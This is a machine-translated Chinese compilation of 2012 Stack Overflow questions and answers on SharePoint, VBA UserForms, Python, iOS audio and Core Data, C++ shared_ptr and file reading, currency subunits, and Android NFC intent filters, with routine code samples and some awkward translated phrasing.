                    queryBuilder.Append(@"<FieldRef Name='Title' />");
                    queryBuilder.Append(@"</OrderBy>");
                    queryBuilder.Append(@"<Where>");
                    queryBuilder.Append(@"<Eq>");
                    queryBuilder.Append(@"<FieldRef Name='Title' />");
                    queryBuilder.Append(@"<Value Type='Text'>" + var_UserName + "</Value>");
                    queryBuilder.Append(@"</Eq>");
                    queryBuilder.Append(@"</Where>");
                    queryBuilder.Append(@"</Query>");
                    SPQuery query = new SPQuery();
                    query.Query = queryBuilder.ToString();
                    SPListItemCollection oSPListItemCollection = userList.GetItems(query);
                    SPField field = userList.Fields.GetField("E-Mail");

                    foreach (SPItem item in oSPListItemCollection)
                    {
                        if (item["Title"].ToString().ToLower() == Login1.UserName.ToLower())
                        {
                         item[field.InternalName] = var_newemail;
                         curWeb.AllowUnsafeUpdates = true;
                         item.Update(); //throws error when not logged in as administrator
                         curWeb.AllowUnsafeUpdates = false;
                         break; 
                        }
                    }

                }
            }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:23:06.803

可能想尝试在您的代码中添加类似这样的内容：

```
 string usName = null;
            SPClaimProviderManager mgr = SPClaimProviderManager.Local;
            if (mgr != null)
            {
                var claim = new SPClaim(SPClaimTypes.UserLogonName,
                                        SPContext.Current.Web.CurrentUser.LoginName,
                                        "http://www.w3.org/2001/XMLSchema#string",
                                        SPOriginalIssuers.Format(SPOriginalIssuerType.Windows));
                usName = mgr.EncodeClaim(claim);

so in your code just try adding:

SPSecurity.RunWithElevatedPrivileges(delegate()
                {
                    using (SPSite site = SPContext.Current.Site)
                   {

 **if (site.DoesUserHavePermissions(usName,SPBasePermissions.ViewPages))
{**

                        SPWeb curWeb = site.OpenWeb();

                        SPList userList = SPContext.Current.Web.SiteUserInfoList;
                        StringBuilder queryBuilder = new StringBuilder();
                        queryBuilder.Append(@"<Query>");
                        queryBuilder.Append(@"<OrderBy>");
                        queryBuilder.Append(@"<FieldRef Name='Title' />");
                        queryBuilder.Append(@"</OrderBy>");
                        queryBuilder.Append(@"<Where>");
                        queryBuilder.Append(@"<Eq>");
                        queryBuilder.Append(@"<FieldRef Name='Title' />");
                        queryBuilder.Append(@"<Value Type='Text'>" + var_UserName + "</Value>");
                        queryBuilder.Append(@"</Eq>");
                        queryBuilder.Append(@"</Where>");
                        queryBuilder.Append(@"</Query>");
                        SPQuery query = new SPQuery();
                        query.Query = queryBuilder.ToString();
                        SPListItemCollection oSPListItemCollection = userList.GetItems(query);
                        SPField field = userList.Fields.GetField("E-Mail");

                        foreach (SPItem item in oSPListItemCollection)
                        {
                            if (item["Title"].ToString().ToLower() == Login1.UserName.ToLower())
                            {
                             item[field.InternalName] = var_newemail;
                             curWeb.AllowUnsafeUpdates = true;
                             item.Update(); //throws error when not logged in as administrator
                             curWeb.AllowUnsafeUpdates = false;
                             break; 
                            }
                        }
}

                    }
                }); 
```

# vba - 将项目添加到在运行时添加到用户窗体的 ComboBox

> ID：12264694
> 
> 赞同：2
> 
> 时间：2012-09-04T13:36:31.053
> 
> 标签：vba, excel

我正在尝试将组合框添加到将在运行时创建的用户表单中，我面临的问题是将项目添加到组合框中？无法弄清楚错误在哪里。谢谢。

```
 Function addComboBox(ByRef TempForm As Object, ByVal controlType As String, 
ByVal pos As Integer, ByVal strCaption As String, ByVal strValues As String)

     Dim NewComboBox As MSforms.ComboBox
     Dim arr As Variant
     Dim i As Integer

     Set NewComboBox = TempForm.Designer.Controls.Add("forms.ComboBox.1")
      arr = Split(strValues, ";")

        With NewComboBox
                .Name = strCaption & "_" & controlType & "_" & pos
                .Top = 20 + (12 * pos)
                .Left = 100
                .Width = 150
                .Height = 12

        End With

      For i = 0 To UBound(arr)

       NewComboBox.AddItem arr(i)

      Next i

    End Function 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:54:07.380

去掉设计师这个词

试试这个（**尝试和测试**）

```
Set NewComboBox = TempForm.Controls.Add("Forms.ComboBox.1") 
```

**跟进**

试试这个。（**经过试验和测试**）

```
Option Explicit

Sub Sample()
    Dim TempForm As Object
    Dim Ret

    Set TempForm = ThisWorkbook.VBProject.VBComponents.Add(3)

    Ret = addComboBox(TempForm, "CBox", 1, "MyCombo", "1;2;3;4")

    VBA.UserForms.Add(TempForm.Name).Show
End Sub

Function addComboBox(ByRef TempForm As Object, ByVal controlType As String, _
ByVal pos As Integer, ByVal strCaption As String, ByVal strValues As String)

    Dim NewComboBox As MSForms.ComboBox
    Dim n As Long, nLines As Long, i As Long
    Dim arr As Variant

    Set NewComboBox = TempForm.designer.Controls.Add("Forms.ComboBox.1")
    arr = Split(strValues, ";")

    With NewComboBox
        .Name = strCaption & "_" & controlType & "_" & pos
        .Top = 20 + (12 * pos)
        .Left = 10
        .Width = 150
        .Height = 12
    End With

    n = 2

    With TempForm
        nLines = .CodeModule.CountOfLines
        .CodeModule.InsertLines nLines + 1, "Private Sub UserForm_Initialize()"
        For i = 0 To UBound(arr)
            .CodeModule.InsertLines nLines + n, "    " & _
            NewComboBox.Name & ".AddItem " & arr(i)
            n = n + 1
        Next i
        .CodeModule.InsertLines nLines + n, "End Sub"
    End With
End Function 
```

**截屏**

![在此处输入图像描述](../Images/d058f273fc530f86d662b88244bfdddf.png)

**更多跟进**

> 感谢您的解决方案，如果我必须多次调用 addComboBox，即添加两个或多个组合框，则会多次创建 UserForm_Initialize 子，这又是个问题。– 维克拉姆

在这种情况下，您必须检查`UserForm_Initialize`proc 是否存在，然后对其进行解析。请参阅下面的代码。我`S`为您的函数添加了一个新的可选参数。我正在使用它来将组合放在另一个下方。

```
Option Explicit

Sub Sample()
    Dim TempForm As Object
    Dim Ret

    Set TempForm = ThisWorkbook.VBProject.VBComponents.Add(3)

    Ret = addComboBox(TempForm, "CBox", 1, "MyCombo", "1;2;3;4")

    Ret = addComboBox(TempForm, "CBox1", 1, "MyCombo1", "5;6;7;8", 20)

    Ret = addComboBox(TempForm, "CBox2", 1, "MyCombo2", "9;10;11;12", 40)

    VBA.UserForms.Add(TempForm.Name).Show
End Sub

Function addComboBox(ByRef TempForm As Object, ByVal controlType As String, _
ByVal pos As Integer, ByVal strCaption As String, ByVal strValues As String, _
Optional s As Long)

    Dim NewComboBox As MSForms.ComboBox
    Dim n As Long, nLines As Long, i As Long, uInitLine As Long
    Dim arr As Variant
    Dim MyModule As Object

    Set NewComboBox = TempForm.Designer.Controls.Add("Forms.ComboBox.1")
    arr = Split(strValues, ";")

    With NewComboBox
        .Name = strCaption & "_" & controlType & "_" & pos
        .Top = 20 + (12 * pos) + s
        .Left = 10
        .Width = 150
        .Height = 12
    End With

    '~~> Connect to the code module of the Userform
    Set MyModule = ThisWorkbook.VBProject.VBComponents(TempForm.Name).CodeModule

    '~~> Check if there is a procedure called UserForm_Initialize
    On Error Resume Next
    uInitLine = MyModule.ProcStartLine("UserForm_Initialize", 0)
    On Error GoTo 0

    With TempForm
        '~~> UserForm_Initialize Found
        If uInitLine > 0 Then
            nLines = uInitLine + 2: n = 0
            For i = 0 To UBound(arr)
                .CodeModule.InsertLines nLines + n, "    " & _
                NewComboBox.Name & ".AddItem " & arr(i)
                n = n + 1
            Next i
        Else
            n = 2

            nLines = .CodeModule.CountOfLines

            .CodeModule.InsertLines nLines + 1, "Private Sub UserForm_Initialize()"
            For i = 0 To UBound(arr)
                .CodeModule.InsertLines nLines + n, "    " & _
                NewComboBox.Name & ".AddItem " & arr(i)
                n = n + 1
            Next i
            .CodeModule.InsertLines nLines + n, "End Sub"
        End If
    End With
End Function 
```

**屏幕截图（用户表单）**

![在此处输入图像描述](../Images/98ca72016369e8fba267d99268cfccb6.png)

**屏幕截图（用户表单代码）**

![在此处输入图像描述](../Images/9bbe626e21137864fe0346ae628e8bf9.png)

# python - Python 等价于 Ruby 的表达式：“puts x += value”

> ID：12264696
> 
> 赞同：4
> 
> 时间：2012-09-04T13:36:39.167
> 
> 标签：python, ruby, language-comparisons

出于好奇...

在红宝石中：

```
=>$ irb
1.8.7 :001 > puts x = 2
2
 => nil 
1.8.7 :002 > puts x += 2 while x < 40
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40 
```

这很方便。

是否有可能在 Python 中用一行代码做到这一点，如果可以，怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:39:55.410

在 Python 中你不能*完全*或*非常相似地做同样的事情的原因是因为***在 Ruby 中，一切都是表达式**。

Python 在语句和表达式之间有区别，并且只能评估表达式（因此打印，我的意思是传递给打印运算符/函数）。

所以这样的代码不能以你向我们展示的那种形式在 Python 中完成。您所能做的就是找到一些“类似”的方式将上面的语句写成 Python 表达式，但绝对不会是“Rubyous”。

*恕我直言，在 Python 中，这种行为是不可能的（如本用例中所述），很好地遵循了 Python 规则的“显式优于隐式”禅宗。*

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:39:55.267

产生相同结果的单线：

```
for x in xrange(4,42,2): print x 
```

给出：

```
4
6
8
10
12
14
16
18
20
22
24
26
28
30
32
34
36
38
40 
```

[xrange](http://docs.python.org/library/functions.html#xrange)是一个内置函数，它返回一个“xrange 对象”，它产生下一个项目而不将它们全部存储（就像这样做），这与 OP 的循环`range`非常相似。`while`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:38:54.553

这在 python 中是不可能的；您不能使用语句 ( `x += 2`) 作为要打印的表达式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T14:41:10.777

在保留其他答案中关于赋值不是 Python 中的表达式的注释后，可以在 Python 中执行此操作：

```
from __future__ import print_function

[print(x) for x in range(0,42,2)] 
```

# ios - 如何在 iOS 上列出可用的音频输出路由

> ID：12264697
> 
> 赞同：5
> 
> 时间：2012-09-04T13:36:39.477
> 
> 标签：ios, audio, routes

现在我想在我的 iPhone 应用程序中列出可用的音频输出路由，如下所示：

[http://www.blogcdn.com/www.tuaw.com/media/2008/09/cb(iphone-101_-switch-between-audio-outputs-for-your-voicemail)1729387198273.jpg](http://www.blogcdn.com/www.tuaw.com/media/2008/09/cb(iphone-101_-switch-between-audio-outputs-for-your-voicemail)1729387198273.jpg)

我知道我可以使用音频会话的 audioRouteChangeListener 来获取路由更改信息，但是这种方法只能在我的应用程序启动后获取消息，所以如果耳机和蓝牙都在我的应用程序运行之前连接，我怎样才能获得这些路由的消息，任何提示表示赞赏。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T10:41:10.530

我使用 MPVolumeView 得到了一些工作。该组件有一个按钮，可让您选择输出音频路径，就像在音乐应用程序中一样。

如果您愿意，可以使用以下方法隐藏滑块（并且只有按钮）：

```
self.myMPVolumeView.showsVolumeSlider = NO; 
```

目前我找不到以编程方式获取输出目的地和输入源的方法，正如我在这个问题中指出的那样[列出可用的输出音频目标 AVAudioSession](https://stackoverflow.com/questions/15643516/list-available-output-audio-target-avaudiosession)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T15:07:13.603

只有 5 个音频**输入**路由（iOS5+）：

```
kAudioSessionInputRoute_LineIn;
kAudioSessionInputRoute_BuiltInMic;
kAudioSessionInputRoute_HeadsetMic;
kAudioSessionInputRoute_BluetoothHFP;
kAudioSessionInputRoute_USBAudio; 
```

并且有9个音频**输出**路由（iOS5+）：

```
kAudioSessionOutputRoute_LineOut;
kAudioSessionOutputRoute_Headphones;
kAudioSessionOutputRoute_BluetoothHFP;
kAudioSessionOutputRoute_BluetoothA2DP;
kAudioSessionOutputRoute_BuiltInReceiver;
kAudioSessionOutputRoute_BuiltInSpeaker;
kAudioSessionOutputRoute_USBAudio;
kAudioSessionOutputRoute_HDMI;
kAudioSessionOutputRoute_AirPlay; 
```

**[在此处找到更多信息，](http://developer.apple.com/library/ios/#documentation/AudioToolbox/Reference/AudioSessionServicesReference/Reference/reference.html)**如何检查它们在您的应用程序中的可用性。

# c++ - 带 malloc 和 free 的 shared_ptr

> ID：12264701
> 
> 赞同：23
> 
> 时间：2012-09-04T13:36:54.303
> 
> 标签：c++, boost, shared-ptr, scoped-ptr

我在包含 c 和 cpp 的大型应用程序中工作。所有文件都保存为 cpp 扩展名，但代码是用 c-style 编写的。我的意思是它是通过 malloc 和 realloc 和 calloc 定义结构而不是类分配内存。最近他们已经安装了 boost 库所以我打算在我现有的代码库中使用所以我有一些以下问题。

1.  我可以将 std::shared_ptr 与 malloc 和 free 一起使用吗？
2.  如果是的话，谁能指出我的示例代码库？
3.  如果我在我的应用程序中创建 std::shared_ptr 并将这个指针传递给另一个使用 malloc 或 calloc 的函数，它会影响任何功能吗？

或者换句话说：

对于以下代码，如何使用 std::shared_ptr 实现类似的功能：

```
void allocateBlocks(int **ptr, int *cnt)
{
    *ptr = (int*)malloc(sizeof(int) * 10);
    *cnt = 10;
    /*do something*/ 
}

int main()
{
    int *p = NULL;
    int count = 0;
    allocateBlocks(&p, &count);
    /*do something*/

    free(p);
} 
```

我们调用一些函数，它们接受双指针并填充其应用程序内部的结构并使用 malloc。我们可以将这些指针分配给 std::shared_ptr 吗？例如：

```
typedef struct txn_s
{
    int s;
    int d;
    int *e;
} txn_t;

typedef boost::shared_ptr<txn_t> tpointer;

tpointer((txn_t*)::malloc(sizeof(txn_t),::free)); 
```

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-09-04T13:55:51.347

> 我可以将 shared_ptr 与 malloc 和 free 一起使用吗？

是的。

> 谁能指出我的示例代码库。

您需要提供一个自定义删除器，以便使用`free`而不是默认释放内存`delete`。这可以是指向`free`函数本身的指针：

```
shared_ptr<void> memory(malloc(1024), free); 
```

请记住，`malloc`并且`free`只处理原始内存，并且您负责正确创建和销毁您可能希望保留在该内存中的任何重要对象。

> 如果我在我的应用程序中创建 shared_ptr 并将这个指针传递给另一个函数（如果他们使用 malloc 或 calloc）。它会影响任何功能吗？

我不太明白这个问题。`shared_ptr`如果这是您所要求的，您可以将其与“普通”共享指针互换使用。*类型擦除*确保指针的用户不受不同类型的删除器的影响。`get()`与任何共享指针一样，如果使用;提取原始指针，则必须小心。具体来说，不要做任何可能的`free`事情，因为您已经不可撤销地将所有权分配给共享指针。

> 我们调用了一些函数，它接受双指针并填充其应用程序内部的结构并使用 malloc 我们可以将这些指针分配给 shared_ptr。

我猜你的意思是这样的：

```
double * make_stuff() {
   double * stuff = static_cast<double*>(malloc(whatever));
   put_stuff_in(stuff);
   return stuff;
}

shared_ptr<double> shared_stuff(make_stuff(), free); 
```

更新：我没有发现短语“双指针”，我认为您的意思是 C 风格使用指针来模拟引用以模拟返回值；你也能做到：

```
void make_stuff(double ** stuff);

double * stuff = 0;
make_stuff(&stuff);
shared_ptr<double> shared_stuff(stuff, free); 
```

> 如何处理 realloc 和 calloc

可以使用 的结果初始化共享指针`calloc`，或者任何其他返回要使用`free`. 您不能使用`realloc`，因为`shared_ptr`已经获得了原始指针的所有权，并且不会在不调用`free`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-04T13:46:02.783

要使用`std::shared_pointer`with `malloc()`，`free()`您应该指定自定义删除器。这应该这样做

```
std::shared_ptr<T> ptr(static_cast<T*>(malloc(sizeof(T))), free); 
```

只要您不传递 的结果`std::shared_ptr<T>::get()`，您的指针就是安全的。

**编辑：**添加了`malloc()`to的转换结果`T*`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:44:37.307

> 我可以将 shared_ptr 与 malloc 和 free 一起使用吗？如果是，谁能指出我的示例代码库。

是的。`shared_ptr`本身不分配内存。但是，一旦引用计数降至零，它就会删除您的对象。由于它`delete`默认使用并且您不能将它与由`malloc`（或任何其他方式）分配的对象一起使用，因此您必须使用[自定义 deleter](https://stackoverflow.com/questions/441306/make-shared-ptr-not-use-delete)。

> 如果我在我的应用程序中创建 shared_ptr 并将这个指针传递给另一个函数（如果他们使用 malloc 或 calloc）。它会影响任何功能吗？

不清楚你在这里问什么。如果该函数不希望传递共享指针，则必须格外小心。但这取决于该功能的实际作用。

> 我们调用了一些函数，它接受双指针并填充其应用程序内部的结构并使用 malloc 我们可以将这些指针分配给 shared_ptr。

是的，您可以将任何指针与`shared_ptr`.

# c# - 遍历当前应用程序的所有用户设置

> ID：12264702
> 
> 赞同：-2
> 
> 时间：2012-09-04T13:36:59.463
> 
> 标签：c#, wpf, c#-4.0

我有一个应用程序存储一些特定于用户的设置。

我创建了一个派生自 ApplicationSettingsBase 的设置类。

```
Public Class MySetting : ApplicationSettingsBase 
```

此类具有指定此设置特定于应用程序会话的属性。

在应用程序退出时（Application.Current.Exit 事件），我想遍历所有用户设置并将所有 <MySetting> 类型设置设置为默认值。这样，这些将是特定于会话的。

例如：默认情况下会在屏幕中央打开一个对话框。对于当前应用程序会话，用户将其移动到屏幕的左上角。现在，如果用户关闭对话框并重新打开它，它将在屏幕的左上角打开。但是当他关闭并重新启动应用程序时，对话框再次出现在屏幕中央。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T14:02:59.040

```
foreach (SettingsProperty property in Settings.Default.Properties)
{
    // do something
} 
```

# c++ - 如何在 C++ 中读取空文件？

> ID：12264703
> 
> 赞同：0
> 
> 时间：2012-09-04T13:37:03.947
> 
> 标签：c++, file-io

如何在 C++ 中读取一个空文件？

我用什么while循环条件来读取空文件？

因为`!fin.eof()`条件不起作用并创建了一个无限循环。

我使用 turbo c++，我有 2 个文件。音乐库文件已经有一些专辑。我需要过滤掉并删除重复的专辑并将其添加到过滤器文件中。

**我的代码如下：**

```
void albumfilter()
{
    song s;
    album a;

    ifstream fin;
    fstream finout;

    fin.open("Musiclibrary.txt", ios::binary);

    while(!fin.eof())
    {
        fin.read((char*)&s,sizeof(s));
        if(fin.eof())
        break;

        finout.open("Filteralbum.txt", ios::binary| ios::in| ios::out);

        while(!finout.eof())
        {
            finout.read((char*)&a, sizeof(a));

            if(strcmp(a.getfilter_albumname(), s.getalbum())!=0)
            {
                strcpy(a.getfilter_albumname(),s.getalbum());
                 finout.write((char*)&a, sizeof(a));
                finout.close();
            }
        }
    }

    fin.close();
} 
```

这段代码正确吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-04T13:38:26.420

`eof()`仅在尝试读取文件末尾时才会设置：您必须尝试至少读取一次。来自[`std::basic_ios::eof`](http://en.cppreference.com/w/cpp/io/basic_ios/eof)：

> 此函数仅报告最近 I/O 操作设置的流状态，它不检查关联的数据源。**例如，如果最近的 I/O 是 get()，它返回文件的最后一个字节，则 eof() 返回 false。下一个 get() 无法读取任何内容并设置 eofbit。只有这样 eof() 才会返回 true。**

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-04T13:40:07.343

就像您将读取一个非空文件一样，您将读取操作作为循环的条件。代码应该是不言自明的：

```
std::vector<std::string> lines;
std::ifstream file("file.x");

if (file.is_open()) {

    while (std::getline(file, line)) {  // you can use operator>> here, too
        lines.push_back(line);
    }

    if (file.bad() || file.fail()) {
        std::cout << "An error occured during reading.";
    } else if (lines.empty()) {
        std::cout << "The file is empty.";
    }

} else {
    std::cout << "Couldn't open file.";
} 
```

如果您`operator>>`用来读取与 s 不同的内容`std::string`，则错误检查的逻辑会发生变化 - 循环可能结束并且 eof 尚未设置。（假设您在`int`s 中读取并且提取操作在此过程中遇到非数字）。您需要考虑到这一点。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-04T14:21:58.660

```
 ifstream fin("empty-file.txt");
       string line;
       while(true){
            fin>>line;
            if(fin.eof())break;
       } 
```

我认为应该这样做。但是为什么要读取一个空文件呢？

# iphone - 如何在 iOS 应用程序中存储不可变文本（在首次和每次启动时可用）？

> ID：12264705
> 
> 赞同：0
> 
> 时间：2012-09-04T13:37:10.007
> 
> 标签：iphone, ios, ios5, core-data

我是 iOS 编程新手，一般编程经验很少（仅限高中水平）。最近注册了一个 iOS 开发者帐户并想创建一个电影行情应用程序。

我想使用 Core Data 来保存超过 300,000 个包含这些实体的报价。 *文本文件的大小约为 8 MB。*

*语录*: Att: theQuote Rel: saidByCharacter, fromMovie

*电影*: Att: movieName, moviePosterLink Rel: quotesFromThisMovie (to-many), characters (to-many)

*MovieCharacter* : Att: characterName Rel: fromMovie

显然，所有这些数据都必须包含在应用程序中。还将有一个文件夹，其中包含超过 50,000 张用于电影海报的小图像。

我的问题是**如何在应用程序中存储文本信息（使用核心数据）？**

我已经阅读了 Apple 的 iOS 核心数据教程，核心数据编程指南，观看了斯坦福的 iOS 课程，阅读了 Stephen Kochan 关于 Objective-C 的书，并在互联网上搜索了有关这个真正入门任务的一些信息，但一无所获。我想知道这件事是否如此简单以至于不需要教程......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T06:50:12.807

如果您选择使用 Core Data--

Ray Wenderlich 的教程很不错：

[http://www.raywenderlich.com/934/core-data-on-ios-5-tutorial-getting-started](http://www.raywenderlich.com/934/core-data-on-ios-5-tutorial-getting-started)

然而，直接使用 Core Data 需要大量的样板代码，这有点痛苦。为了解决这个问题，创建了 Magical Record（和辅助类 Magical Import），它确实简化了过程：

[https://github.com/magicalpanda/MagicalRecord](https://github.com/magicalpanda/MagicalRecord)

然而，正如 Wenderlich 关于“预加载数据”的第二个教程所谈到的，您将需要一些方法来首先将数据导入 Core Data。

为此，您可以在应用程序的捆绑包中使用平面文件（例如 sqlite/sqlite3 文件），或者您可以设置 Web 服务（用于随时间变化的内容，由您控制，如果您捆绑，这是不可能的它进入应用程序）。

您还可以在 Wenderlich 的网站上找到有关创建 Web 服务驱动应用程序的教程。

干杯!

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:29:32.960

查看[Ray Wenderlich 的核心数据教程](http://www.raywenderlich.com/934/core-data-on-ios-5-tutorial-getting-started)- 特别是关于如何将种子数据添加到应用程序的[第 2 部分。](http://www.raywenderlich.com/980/core-data-tutorial-how-to-preloadimport-existing-data)

# python - 在python中获取货币的最小单位

> ID：12264708
> 
> 赞同：10
> 
> 时间：2012-09-04T13:37:15.373
> 
> 标签：python

信用卡提供商需要以美分或最小可用货币单位为单位的交易金额。因为我希望代码是可移植的，所以我必须获得给定货币的最小单位，并且它是主要单位的因素。我试图从语言环境模块中获取它，但我没有运气。

[http://docs.python.org/library/locale.html](http://docs.python.org/library/locale.html)

**例子**

[我有一个ISO 4217](http://en.wikipedia.org/wiki/ISO_4217)中描述的货币代码

EUR 对欧元

那么我需要 1 欧元是 100 欧分（只有信息 1/100，不需要文字）

根据[维基百科](http://en.wikipedia.org/wiki/Pound_sterling)，有超过 2 个单位的货币，如旧庞德英镑

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-04T15:55:00.950

或者，可以使用以下简单的映射模块： http: [//pastebin.com/K7kVXi8P](http://pastebin.com/K7kVXi8P)

将此 pastebin 保存到项目中的模块中（例如 simple_currency_helper.py）并使用映射（或辅助方法`get_currency_subunit`）获取给定 ISO 代码的货币子单元。

```
>>> from simple_currency_helper import get_currency_subunit
>>> print get_currency_subunit('TND')
1000 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:30:32.287

您可以查看[python-money](http://code.google.com/p/python-money/)或[ccy](http://pypi.python.org/pypi/ccy)模块。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T15:04:24.567

据我所知，没有一个现有的模块可以为您提供该信息。但是，您需要的所有数据似乎都列在这里：[http ://en.wikipedia.org/wiki/List_of_circulating_currencies](http://en.wikipedia.org/wiki/List_of_circulating_currencies)

您可能需要维护自己的列表（使用维基百科页面作为初始来源）。然后，进行自己的映射将是相当直接的。

为了让你开始，这里有一个快速的技巧。在该维基百科页面上，在浏览器的 Javascript 控制台中粘贴并运行以下脚本将解析内容并将数据的 python 友好版本附加到页面：

```
var out = "data = {\n";
$("table.wikitable").find("tr").each(function(idx) {
    if (idx == 0) return;  // Skip first line.
    var last3 = $(this).find("td").slice(-3);
    var code = $(last3[0]).text();
    if (code != "None") {
        var scale = $(last3[2]).text().replace(",","");
        if (scale != "None") {
            var minor_name = $(last3[1]).text().split("[")[0];
            out += '  "' + code + '": ("' + minor_name + '", ' + scale + '),' + "\n";
        }
    }
});
out += "}";

$("<pre>").text(out).appendTo($("body")); 
```

这是一个示例输出（使用 Firebug 运行的脚本）：

![](../Images/853d1c4681bb7a82cc02ac1bd034c83f.png)

这是输出：[https ://gist.github.com/16d43be2652a06cf962d](https://gist.github.com/16d43be2652a06cf962d)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T15:09:28.950

python 的语言环境模块可以为您提供这些信息，但仅限于您正在使用的语言环境的货币，不幸的是它不是多币种。

[locale.localconv()](http://docs.python.org/library/locale.html#locale.localeconv)可以为您提供当前语言环境的信息（位数是`'int_frac_digits'`成员）。例如，如果您使用 en_US 进行本地化，您可以这样做：

```
locale.setlocale(locale.LC_MONETARY, "en_US")  # set the en_US locale
locale.localeconv()['int_frac_digits']
>>> 2
locale.localeconv()['int_curr_symbol']
>>> 'USD ' 
```

但是，如果您需要处理每种货币，正如另一个人所说，您必须自己制作/维护您的桌子。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T14:56:14.783

我不知道它是否适用于python。我们曾经使用这个[xml](http://dl.dropbox.com/u/51282547/xml/currency-list.xml)。

```
<item code="USD" symbol="$" sort="20" iso="840">
<name lang="en">
  <singular>
    <nominative>US dollar</nominative>
    <genitive>US dollar</genitive>
    <dative>US dollar</dative>
    <full>US dollar</full>
    <prepos>US dollar</prepos>
  </singular>
  <plural>
    <nominative>US dollars</nominative>
    <genitive>US dollars</genitive>
    <dative>US dollars</dative>
    <full>US dollars</full>
    <prepos>US dollars</prepos>
  </plural>
</name>
<frac lang="en">100 cents</frac>
<bank href="http://www.federalreserve.gov/">
  <name lang="en">
    <nominative>The U.S. Federal Reserve System</nominative>
    <genitive>The U.S. Federal Reserve System</genitive>
  </name>
</bank>
<synonim lang="en">
  <item>buck</item>
  <item>green buck</item>
</synonim>
<banknotes/>
</item> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-02-06T14:40:59.440

几年以来，就有了[iso4217 包](https://pypi.python.org/pypi/iso4217)。它为每个主要货币单位的次要货币单位数提供 ISO 小数点/以 10 为底的指数：

```
>>> import iso4217
>>> iso4217.Currency(u'EUR').exponent
2 
```

您可以使用它直接在小额货币和大额货币之间进行转换：

```
def to_small_currency(large_currency_amount, iso_code):
    exponent = iso4217.Currency(iso_code).exponent
    if exponent == 0:  # 0 signals unused/nonexistent minor currency
        return large_currency_amount
    return large_currency_amount * (10 ** exponent) 
```

请注意，有一些货币不使用 base-10 作为其次要货币。目前，这些是`MRU`和`MGA`。ISO 4217 仍然用指数 1 表示它们，并且`iso4217`包也是如此。

# android - 通过 NFC 标签上的 URL 启动 Android 应用

> ID：12264709
> 
> 赞同：2
> 
> 时间：2012-09-04T13:37:17.597
> 
> 标签：android, nfc

我正在编写一些 NFC-Tag 的 URL 以对主机名进行意图过滤 - 如果已安装，则启动应用程序，如果未安装应用程序，则提供指向 google-play 的链接。不幸的是，只有浏览器出现：

```
<intent-filter>
 <action android:name="android.intent.action.VIEW"></action>
 <category android:name="android.intent.category.DEFAULT"></category>
 <category android:name="android.intent.category.BROWSABLE"></category>
 <data android:host="example.com" android:scheme="http" />
</intent-filter> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:39:26.533

行动需要不同：

```
 <intent-filter>
    <action android:name="android.nfc.action.NDEF_DISCOVERED"></action>
    <category android:name="android.intent.category.DEFAULT"></category>
    <data android:host="example.com" android:scheme="http" />
 </intent-filter> 
```

仍然不需要许可

# java - 当前位置和搜索位置之间的道路/路线图

> ID：12264710
> 
> 赞同：0
> 
> 时间：2012-09-04T13:37:21.723
> 
> 标签：java, android, android-layout, android-mapview, android-maps

这是执行 2 点之间的道路路径或路线路径的`(origin, current location){geoPoint, "current Location"}`代码`Destination.{geoPoint1, "Desti Location2"}`。它对我来说很好。

我的问题是**如何在当前位置到搜索位置之间进行道路路径**。在这里，我是`onClick`按钮搜索位置，它显示完美，但是在参考之间的路线图中出现错误--> `{current location(scrgeoPoint) to searched location(destgeopointsearch)}`。

有人有什么想法吗？

```
 //search button onclick
     mapLocationBtn = (Button) findViewById(R.id.locationbutton);
     mapLocationBtn.setVisibility(View.INVISIBLE);
     mapLocationBtn.setOnClickListener(new View.OnClickListener() {              
            @Override
            public void onClick(View v) {           
                String usrLoc = autoCompletetextView.getText().toString();
                Geocoder gc = new Geocoder(PlacesMapActivity.this);                 
                try {
                    addr=gc.getFromLocationName(usrLoc, 3);//maximum 2 results
                    if(addr.size()>0){
                        address=addr.get(0);//get the first result
                        convertLongi=address.getLongitude();
                        convertLati=address.getLatitude();
                        geopointsearch = new GeoPoint((int)(convertLati * 1E6), (int)(convertLongi * 1E6));                                     

                     // Map geopointsearch overlay item
                        itemizedOverlay2 = new AddItemizedOverlay(drawable_client, PlacesMapActivity.this);     
                        overlayitem = new OverlayItem(geopointsearch, "Your Location3", "R u Searching For me!");
                        itemizedOverlay2.addOverlay(overlayitem);       
                        mapOverlays.add(itemizedOverlay2);
                        itemizedOverlay2.populateNow();
                        mc.animateTo(geopointsearch);   
                     //   mc.zoomIn();
                    }                       
                } catch (IOException e) {                   
                    e.printStackTrace();
                }
            }                                   
        });

    // Map overlay item
    itemizedOverlay = new AddItemizedOverlay(drawable_user, this);
    overlayitem = new OverlayItem(geoPoint, "Your Location","That is you!");
    itemizedOverlay.addOverlay(overlayitem);        
    mapOverlays.add(itemizedOverlay);
    itemizedOverlay.populateNow();      
    // Map client overlay item
    itemizedOverlay1 = new AddItemizedOverlay(drawable_client, this);       
